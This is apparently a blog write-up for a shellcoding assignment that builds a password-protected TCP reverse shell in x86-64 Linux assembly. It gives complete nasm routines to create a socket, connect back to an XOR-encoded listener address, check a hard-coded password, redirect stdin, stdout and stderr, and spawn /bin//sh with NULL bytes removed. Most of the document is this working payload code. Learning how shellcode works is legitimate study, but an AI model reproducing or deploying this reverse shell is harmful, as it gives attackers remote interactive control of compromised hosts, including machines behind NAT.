## Theory

As usual, here's a diagram that represents the logic a password-protected TCP Reverse Shell:

Once a TCP socket is created, the shellcode connects to a specific TCP listener identified by an `IP:PORT` pair.

Next, the shellcode reads the password from the client and checks whether it is correct.

After that, the program redirects input, output and error to the newly-created socket.

Finally, a shell is spawned, providing an interactive session to the attacker.

## Implementation

### Socket Creation

As mentioned during the first assignment, creating a socket is pretty straight-forward on `x86-64` Linux systems since there is a specific syscall named `socket`:

<figure class="kg-card kg-image-card kg-card-hascaption"><img src="__GHOST_URL__/content/images/2022/06/image-9.png" class="kg-image" alt="Syscall socket on x86-64 systems" loading="lazy" width="1453" height="410" srcset="__GHOST_URL__/content/images/size/w600/2022/06/image-9.png 600w, __GHOST_URL__/content/images/size/w1000/2022/06/image-9.png 1000w, __GHOST_URL__/content/images/2022/06/image-9.png 1453w" sizes="(min-width: 720px) 720px"><figcaption class="figure-caption">Syscall `socket` on `x86-64` systems</figcaption>

As shown in the screenshot above, the syscall `socket` accepts three arguments:

<ol><li>`**family**` is a integer specifying the family of the socket; in my Â case, I'll be using `AF_INET`, i.e. the IPv4 protocol
- `**type** `indicates the type of socket, for example TCP or UDP
- `**protocol**` refers to the protocol used for the specific type of socket; in this case there's only the TCP protocol

Putting this knowledge into practice, I managed to write the following assembly code:

```nasm
global _start

section .text

_start:

CreateSocket:

    ; clear registers for later usage
    xor esi, esi
    mul rsi

    ; 1st argument of socket(): communication domain
    ; in this case AF_INET, so it's based upon the IPv4 protocol
    push rdx
    pop rdi
    add rdi, 2
    
    ; 2nd argument of socket(): type of socket
    ; in this case: SOCK_STREAM, which means it uses the TCP protocol
    inc rsi

    ; 3rd argument: https://stackoverflow.com/questions/3735773/what-does-0-indicate-in-socket-system-call

    ; Syscall socket()
    add eax, 41

    ; create socket and save the resulting file descriptor inside RAX
    syscall
```

<figcaption class="figure-caption">Creating a TCP socket in Assembly</figcaption>

In the snippet above I defined a new routine named `CreateSocket` which is responsible for creating a new TCP socket.

### Socket Connection

Unlike a bind shell, password-protected or not, this shellcode doesn't need to call syscalls such as `listen` or `accept`, since **the attacker** is not going to connect to this socket.

The opposite is true: **the socket **is going to connect to the TCP listener set up by the attacker.

This is what allows attackers to get a shell on servers and workstations hidden by `NAT`.

To perform this operation, there's a convenient syscall named `connect` we can use:

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/connect.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">connect(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a>

It accepts three arguments:

<ol><li>`**sockfd** `is the file descriptor returned by the `socket` syscall
- `**addr** `is a pointer to a sockaddr structure containing the remote address and TCP port of the attacker listener
- `**addrlen** `is a integer that specifies the length of the previous sockaddr structure, usually 16-bytes long

Putting this pieces of information together, I came up with the following routine:

```nasm
Connect:

    ; 1st argument of connect(): file descriptor of the socket to connect
    mov rdi, rax

    xor esi, esi
    mul rsi

    ; padding for the sockaddr struct
    push rax

    ; address 127.0.0.1:4444
    mov rbx, 0xfeffff80a3eefffd
    mov rcx, 0xffffffffffffffff
    xor rbx, rcx

    ; push the pointer to the remote address on the stack
    push rbx
    mov rsi, rsp

    ; 3rd argument of connect(): size of the sockaddr struct
    add edx, 16

    ; syscall connect()
    add eax, 42

    ; invoke connect()
    syscall
```

<figcaption class="figure-caption">Connection to the remote address `127.0.0.1:444`</figcaption>

The peculiarity about the `sockaddr` structure is that it needs some padding bytes at the end, which are going to be `NULL` bytes.

For this reason, I decided to use the **XOR** operation in order to remove eventual `NULL` bytes from the shellcode, while still being able to add the required padding.

### Password Protection

I've already mentioned in the previous assignment that we can add password-protection by means of the syscall `read`, reading some bytes from the client and comparing them to a hard-coded password.

This means that after the attacker receives a callback on the TCP listener, they'll need to send the password before being able to execute commands on the remote system.

The following routines (`CheckPassword` and `ExitWrongPassword`) are copied from the previous assignment, so take a look at it for more information.

```nasm
CheckPassword:

    ; 3rd argument of read(): number of bytes to read
    add rdx, 8

    ; allocate 8 bytes on the stack for storing the password
    sub rsp, rdx

    ; 2nd argument of read(): pointer to buffer which will store the
    ; bytes received from the client
    mov rsi, rsp

    ; 1st argument of read() (client socket) shoud be unchanged (RDI)

    ; syscall read()
    xor eax, eax

    ; call read()
    syscall

    pop rbx
    mov rax, 0x0a32322174636272
    xor rax, rbx
    jz IO_Redirection

ExitWrongPassword:

    xor eax, eax
    add eax, 60
    syscall
```

<figcaption class="figure-caption">Routine for validating the password</figcaption>

### I/O Redirection

Before effectively spawning a shell, you need to redirect input, output, and errors too.

This way, when the attacker send some input to the TCP listener, data will be treated as input for the spawned shell. Same thing goes for output and errors.

You can achieve this type of redirection through the syscall `dup2`:

<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/dup.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">dup(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a>

Follows the assembly code for this function:

```nasm
IO_Redirection:

    xor ecx, ecx
    mul rcx
    add ecx, 2

DuplicateFileDescriptor:

    ; 1st argument of dup2(), file descriptor of the client socket, should be unchanged (RDI)
    ; 2nd argument of dup2(): file descriptor to redirect: stdin/stdout/stderr
    ; in this case the value is stored inside RCX
    ; - 2 (sterr)
    ; - 1 (stdout)
    ; - 0 (stdin)
    push rcx
    
    ; syscall: dup2()
    push rdx
    pop rax
    add eax, 33

    ; 2nd argument of dup2(): file descriptor to redirect
    mov rsi, rcx

    ; call dup2()
    syscall

    pop rcx
    dec rcx
    jns DuplicateFileDescriptor
```

<figcaption class="figure-caption">Redirection of input, output, and errors</figcaption>

Overall, these routines can be converted to the C code listed below:

```cpp
void main(int argc, char* argv[])
{
    // ...
    
    dup2(create_socket_fd, 2);
    dup2(create_socket_fd, 1);
    dup2(create_socket_fd, 0);
    
    // ...
}
```

### Spawning a Shell

The final step is to spawn a shell e.g., `/bin/sh` or `/bin/bash`. You can do so by using the syscall `execve`.

The snippet of code below is an assembly routine which does exactly this, however it uses the path `/bin//sh`, in order to avoid using `NULL` bytes in the path passed to `execve`.

```nasm
SpawnSystemShell:

    ; clear RAX register (zero-sign extended)
    xor eax, eax

    ; NULL terminator for the string below
    push rax

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    mov rdx, rsp

    ; string "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx

    ; 1st argument of execve: executable to run
    mov rdi, rsp

    ; 2nd argument of execve: array of arguments passed to the executable
    push rax

    push rdi
    mov rsi, rsp

    ; syscall execve
    add eax, 0x3b

    ; invoke execve
    syscall

```

The following proof of concept demonstrates the successful creation of a password-protected reverse shell:
